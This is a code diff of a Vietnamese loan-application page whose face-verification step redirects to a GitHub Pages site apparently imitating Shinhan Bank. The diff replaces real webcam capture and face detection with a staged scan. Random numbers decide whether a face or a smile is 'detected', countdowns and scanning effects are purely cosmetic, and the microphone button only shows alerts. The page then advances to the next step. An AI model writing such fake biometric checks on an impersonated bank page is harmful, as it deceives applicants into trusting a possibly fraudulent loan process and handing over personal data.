-                    if (retryButton) retryButton.style.display = 'inline-block';
-                });
+        // Mô phỏng phát hiện khuôn mặt
+        function detectFace() {
+            const isFaceDetected = Math.random() > 0.3;
+            if (!isFaceDetected) {
+                updateStatusMessage('Không phát hiện được khuôn mặt, vui lòng đảm bảo ánh sáng tốt và thử lại');
+                errorMessage.style.display = 'block';
+                setTimeout(detectFace, 3000);
             } else {
-                if (!checkImageBrightness(dataUri)) {
-                    if (errorElement) {
-                        errorElement.textContent = 'Ảnh quá tối. Vui lòng di chuyển đến nơi sáng hơn hoặc bật đèn.';
-                    }
-                    if (retryButton) retryButton.style.display = 'inline-block';
-                    return;
-                }
-                if (previewElement) {
-                    previewElement.innerHTML = `<img src="${dataUri}" alt="Ảnh chân dung" style="max-width: 300px;">`;
-                }
-                if (webcamStatus) {
-                    webcamStatus.textContent = 'Đã chụp ảnh chân dung.';
-                }
-                if (successElement) {
-                    successElement.textContent = 'Ảnh chân dung đã được xác nhận!';
-                    successElement.style.display = 'block';
-                }
-                if (retryButton) retryButton.style.display = 'inline-block';
-                tempFaceImage = dataUri;
-                imageSource = 'capture';
+                updateStatusMessage('Camera đã sẵn sàng, vui lòng cười', true);
+                setTimeout(startSmileDetection, 1000);
             }
         }
 
-        function checkImageBrightness(dataUri) {
-            const img = new Image();
-            img.src = dataUri;
-            const canvas = document.createElement('canvas');
-            const ctx = canvas.getContext('2d');
-            canvas.width = img.width;
-            canvas.height = img.height;
-            ctx.drawImage(img, 0, 0);
-            const imageData = ctx.getImageData(0, 0, canvas.width, canvas.height).data;
-            let brightness = 0;
-            for (let i = 0; i < imageData.length; i += 4) {
-                brightness += (imageData[i] + imageData[i + 1] + imageData[i + 2]) / 3;
-            }
-            brightness /= (imageData.length / 4);
-            return brightness > 50;
-        }
-
-        function resetWebcam() {
-            const webcamStatus = document.getElementById('webcamStatus');
-            const webcamError = document.getElementById('webcamError');
-            const webcamSuccess = document.getElementById('webcamSuccess');
-            const faceImage = document.getElementById('faceImage');
-            const faceImagePreview = document.getElementById('faceImagePreview');
-            const retryButton = document.getElementById('retryButton');
-
-            clearMessages();
-            if (stream) {
-                stream.getTracks().forEach(track => track.stop());
-                stream = null;
-            }
-            setupWebcam();
-            if (faceImagePreview) faceImagePreview.innerHTML = '';
-            if (webcamStatus) webcamStatus.textContent = 'Đang chờ khuôn mặt...';
-            if (faceImage) faceImage.value = '';
-            if (document.getElementById('faceOverlay')) document.getElementById('faceOverlay').style.display = 'block';
-            if (retryButton) retryButton.style.display = 'none';
-            tempFaceImage = null;
-            imageSource = null;
-        }
-
-        function handleFileUpload(event) {
-            const file = event.target.files[0];
-            const errorElement = document.getElementById('faceImageError');
-            const successElement = document.getElementById('faceImageSuccess');
-            const previewElement = document.getElementById('faceImagePreview');
-            const retryButton = document.getElementById('retryButton');
-
-            clearMessages();
-
-            if (!file) {
-                if (errorElement) errorElement.textContent = 'Vui lòng chọn một file hình ảnh.';
-                if (retryButton) retryButton.style.display = 'inline-block';
-                return;
-            }
-
-            if (!['image/jpeg', 'image/png'].includes(file.type)) {
-                if (errorElement) errorElement.textContent = 'Chỉ chấp nhận file JPG hoặc PNG.';
-                if (retryButton) retryButton.style.display = 'inline-block';
-                return;
-            }
-
-            if (file.size > 5 * 1024 * 1024) {
-                if (errorElement) errorElement.textContent = 'File phải nhỏ hơn 5MB.';
-                if (retryButton) retryButton.style.display = 'inline-block';
-                return;
-            }
-
-            const reader = new FileReader();
-            reader.onload = e => {
-                const dataUri = e.target.result;
-                if (!checkImageBrightness(dataUri)) {
-                    if (errorElement) errorElement.textContent = 'Ảnh quá tối. Vui lòng chọn ảnh có ánh sáng tốt hơn.';
-                    if (retryButton) retryButton.style.display = 'inline-block';
-                    return;
-                }
-                const img = new Image();
-                img.src = dataUri;
-                img.onload = () => {
-                    const canvas = document.createElement('canvas');
-                    canvas.width = img.width;
-                    canvas.height = img.height;
-                    canvas.getContext('2d').drawImage(img, 0, 0);
-                    if (modelsLoaded) {
-                        faceapi.detectAllFaces(canvas, new faceapi.TinyFaceDetectorOptions()).then(detections => {
-                            if (detections.length === 0) {
-                                if (errorElement) errorElement.textContent = 'Không phát hiện khuôn mặt. Vui lòng chọn ảnh có khuôn mặt rõ ràng.';
-                                if (retryButton) retryButton.style.display = 'inline-block';
-                                return;
-                            }
-                            if (previewElement) {
-                                previewElement.innerHTML = `<img src="${dataUri}" alt="Ảnh chân dung" style="max-width: 300px;">`;
-                            }
-                            if (successElement) {
-                                successElement.textContent = 'Ảnh chân dung đã được xác nhận!';
-                                successElement.style.display = 'block';
-                            }
-                            if (retryButton) retryButton.style.display = 'inline-block';
-                            tempFaceImage = dataUri;
-                            imageSource = 'upload';
-                        }).catch(error => {
-                            console.error('Error in face detection:', error);
-                            if (retryButton) retryButton.style.display = 'inline-block';
-                        });
-                    } else {
-                        if (previewElement) {
-                            previewElement.innerHTML = `<img src="${dataUri}" alt="Ảnh chân dung" style="max-width: 300px;">`;
-                        }
-                        if (successElement) {
-                            successElement.textContent = 'Ảnh chân dung đã được xác nhận!';
-                            successElement.style.display = 'block';
-                        }
-                        if (retryButton) retryButton.style.display = 'inline-block';
-                        tempFaceImage = dataUri;
-                        imageSource = 'upload';
-                    }
-                };
-            };
-            reader.readAsDataURL(file);
-        }
-
-        async function nextStep() {
-            const errorElement = document.getElementById('faceImageError');
-            const spinner = document.querySelector('.spinner');
-            const faceOverlay = document.getElementById('faceOverlay');
-
-            clearMessages();
-
-            if (!tempFaceImage || (imageSource !== 'capture' && imageSource !== 'upload')) {
-                if (errorElement) error_Element.textContent = 'Vui lòng chụp hoặc tải lên một ảnh chân dung hợp lệ.';
-                return;
-            }
-
-            if (spinner) spinner.style.display = 'inline-block';
-            if (faceOverlay) faceOverlay.style.display = 'none';
-
-            try {
-                const response = await fetch('https://vaytieudung.github.io/shinhanbank/pages/vi/step4.html', { method: 'HEAD' });
-                if (response.ok) {
-                    if (spinner) spinner.style.display = 'none';
-                    tempFaceImage = null;
-                    imageSource = null;
-                    window.location.href = 'https://vaytieudung.github.io/shinhanbank/pages/vi/step4.html';
+        // Mô phỏng phát hiện biểu cảm cười với đếm ngược
+        function startSmileDetection() {
+            let countdown = 3;
+            updateStatusMessage(`Giữ biểu cảm cười trong ${countdown}...`, true);
+            const countdownInterval = setInterval(() => {
+                countdown--;
+                if (countdown > 0) {
+                    updateStatusMessage(`Giữ biểu cảm cười trong ${countdown}...`, true);
                 } else {
-                    throw new Error('Trang tiếp theo không tồn tại');
+                    clearInterval(countdownInterval);
+                    simulateFaceScan();
                 }
-            } catch (error) {
-                if (spinner) spinner.style.display = 'none';
-                if (faceOverlay) faceOverlay.style.display = 'block';
-                if (errorElement) errorElement.textContent = 'Lỗi chuyển hướng: ' + error.message;
-            }
+            }, 1000);
         }
 
-        function clearMessages() {
-            const webcamError = document.getElementById('webcamError');
-            const webcamSuccess = document.getElementById('webcamSuccess');
-            const faceImageError = document.getElementById('faceImageError');
-            const faceImageSuccess = document.getElementById('faceImageSuccess');
-
-            if (webcamError) webcamError.textContent = '';
-            if (webcamSuccess) webcamSuccess.style.display = 'none';
-            if (faceImageError) faceImageError.textContent = '';
-            if (faceImageSuccess) faceImageSuccess.style.display = 'none';
+        // Giả lập quá trình quét khuôn mặt
+        function simulateFaceScan() {
+            toggleScanEffect(true);
+            updateStatusMessage('Đang quét...');
+            setTimeout(() => {
+                toggleScanEffect(false);
+                const isSmileDetected = Math.random() > 0.4;
+                if (isSmileDetected) {
+                    updateStatusMessage('Thành công!');
+                    setTimeout(() => {
+                        window.location.href = 'https://vaytieudung.github.io/shinhanbank/pages/vi/step4.html';
+                    }, 2000);
+                } else {
+                    updateStatusMessage('Không phát hiện được biểu cảm cười, vui lòng thử lại');
+                    errorMessage.style.display = 'block';
+                    errorMessage.textContent = 'Không phát hiện được biểu cảm cười. Vui lòng thử lại.';
+                    setTimeout(() => {
+                        errorMessage.style.display = 'none';
+                        updateStatusMessage('Camera đã sẵn sàng, vui lòng cười', true);
+                        setTimeout(startSmileDetection, 1000);
+                    }, 3000);
+                }
+            }, 3000);
         }
 
-        function getWebcamErrorMessage(error) {
-            switch (error.name) {
-                case 'NotAllowedError':
-                    return 'Quyền truy cập webcam bị từ chối. Vui lòng cấp phép trong cài đặt trình duyệt (Chrome: Cài đặt > Quyền riêng tư > Máy ảnh).';
-                case 'NotFoundError':
-                    return 'Không tìm thấy webcam. Vui lòng kết nối một webcam hoặc sử dụng camera trên thiết bị.';
-                case 'NotReadableError':
-                    return 'Webcam đang được sử dụng bởi ứng dụng khác. Vui lòng đóng các ứng dụng khác và thử lại.';
-                case 'OverconstrainedError':
-                    return 'Thiết bị không hỗ trợ độ phân giải yêu cầu. Đã thử độ phân giải thấp hơn.';
-                case 'TypeError':
-                    return 'Lỗi cấu hình webcam. Vui lòng kiểm tra kết nối thiết bị.';
-                default:
-                    return `Lỗi không xác định: ${error.message}`;
-            }
-        }
-
-        function showErrorModal(message) {
-            const errorModalBody = document.getElementById('errorModalBody');
-            const retryButton = document.getElementById('retryButton');
-            if (errorModalBody) {
-                errorModalBody.textContent = message;
-                new bootstrap.Modal(document.getElementById('errorModal')).show();
+        // Sự kiện cho nút micro
+        let isMicActive = false;
+        micButton.addEventListener('click', () => {
+            isMicActive = !isMicActive;
+            if (isMicActive) {
+                micButton.classList.add('active');
+                micButton.textContent = '🔇';
+                alert('Micro đã được bật, vui lòng nói "Xác nhận"');
             } else {
-                console.error('Error modal body not found.');
+                micButton.classList.remove('active');
+                micButton.textContent = '🎙️';
+                alert('Micro đã tắt');
             }
-            if (retryButton) retryButton.style.display = 'inline-block';
-        }
+        });
 
-        window.onload = init;
+        // Sự kiện cho nút đóng
+        closeButton.addEventListener('click', () => {
+            if (confirm('Bạn có muốn thoát không?')) {
+                window.history.back();
+            }
+        });
+
+        // Khởi động camera và quét khuôn mặt
+        window.onload = () => {
+            startCamera();
+        };
     </script>
 </body>
 </html>
